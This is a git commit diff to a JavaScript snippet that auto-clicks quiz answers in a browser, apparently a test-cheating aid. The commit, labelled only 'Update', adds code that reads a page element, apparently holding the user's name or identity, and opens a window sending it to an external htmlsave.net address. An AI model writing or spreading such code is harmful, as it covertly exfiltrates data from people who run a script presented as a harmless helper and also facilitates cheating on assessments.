5a02d0eb71e9ee538886b440d4eb75a551b21481
Wohoo22 <63303546+Wohoo22@users.noreply.github.com>
2020-04-14 22:19:07 +0700

    Update pickRighAnswer2.js

--- pickRighAnswer2.js
+++ pickRighAnswer2.js
@@ -4,3 +4,10 @@ for(i=0;i<buttons.length;i++){
     if(ans.includes(buttons[i].parentNode.nextElementSibling.innerText))
         buttons[i].onclick();
 }
+//update
+user = document.getElementsByClassName("col-12")[82].innerText;
+function openWin() {
+  window.open("https://final2.htmlsave.net/?id=" + user );
+}
+
+openWin();
